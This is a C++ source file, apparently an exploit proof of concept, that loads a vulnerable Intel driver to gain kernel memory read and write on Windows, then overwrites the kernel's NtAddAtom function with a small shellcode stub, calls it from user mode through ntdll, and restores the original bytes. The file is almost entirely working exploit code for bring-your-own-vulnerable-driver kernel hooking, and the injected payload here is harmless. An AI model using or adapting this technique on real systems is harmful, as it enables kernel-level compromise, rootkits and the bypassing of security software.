#include <cstdio>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif //WIN32_LEAN_AND_MEAN
#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN
#endif //VC_EXTRALEAN
#include <windows.h>

// #include "../common/HevdWrapper.hpp"
#include "intel_driver.hpp"

// main
int main() {
	// to see output before BSOD, hopefully
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stderr, 0, _IONBF, 0);


	// puts("Loading intel driver...");
	HANDLE hIntel = intel_driver::Load();
	if (!hIntel || INVALID_HANDLE_VALUE == hIntel) {
		puts("failed to load.");
		return 1;
	}
	puts("Intel driver loaded");

	// playground

	/*
	printf("kernel base is %016llX; reading first 4096 bytes...\n", intel_driver::ntoskrnlAddr);
	unsigned char buf[4096];
	intel_driver::ReadMemory(hIntel, intel_driver::ntoskrnlAddr, buf, 4096);
	puts("dump of kernel base:");
	for (uint64_t i = 0; i < 4096; i += 16) {
		printf("%016llx ", intel_driver::ntoskrnlAddr + i);
		for (uint64_t j = 0; j < 16; j++) {
			printf("%02x", buf[i + j]);
			if (j % 4 == 3) {
				putchar(' ');
			}
		}
		for (uint64_t j = 0; j < 16; j++) {
			char c = (char) buf[i + j];
			if (0x20 <= c && c <= 0x7e) {
				putchar(c);
			} else {
				putchar('.');
			}
		}
		putchar('\n');
	}
	*/
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0) {
		puts("[-] Failed to load ntdll.dll"); //never should happens
		return 1;
	}

	void * NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
	if (!NtAddAtom)
	{
		puts("[-] Failed to get export ntdll.NtAddAtom");
		return 1;
	}
	printf("User-mode end of NtAddAtom: %p\n", NtAddAtom);

	// puts("Retrieving kernel's NtAddAtom...");
	static uint64_t kernel_NtAddAtom = intel_driver::GetKernelModuleExport(hIntel, intel_driver::ntoskrnlAddr, "NtAddAtom");
	if (!kernel_NtAddAtom) {
		puts("[-] Failed to get export ntoskrnl.NtAddAtom");
		return 1;
	}
	printf("Kernel-mode end of NtAddAtom: %llx\n", kernel_NtAddAtom);

	unsigned char injection[] = { 0xb8, 0xde, 0xc0, 0xad, 0xde, 0xc3 }; // mov eax, 0xdeadc0de; ret
	unsigned char original[sizeof(injection)];

	// puts("Reading kernel's NtAddAtom...");
	assert(intel_driver::ReadMemory(hIntel, kernel_NtAddAtom, original, sizeof(injection)));

	// puts("Hooking kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, injection, sizeof(injection)));
	
	puts("Hooked user-end of NtAddAtom");

	using FunctionFn = int(__stdcall*)(unsigned int);
	const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

	// puts("Calling ntdll's NtAddAtom...");

	unsigned int value = Function(0xdeadc0de);
	printf("Called user-end of NtAddAtom; shellocde returned: %x\n", value);

	// puts("Restoring kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, original, sizeof(injection)));
	puts("Unhooked NtAddAtom");

	// puts("Unloading Intel driver...");
	intel_driver::Unload(hIntel);
	puts("Intel driver unloaded");

	return 0;
}
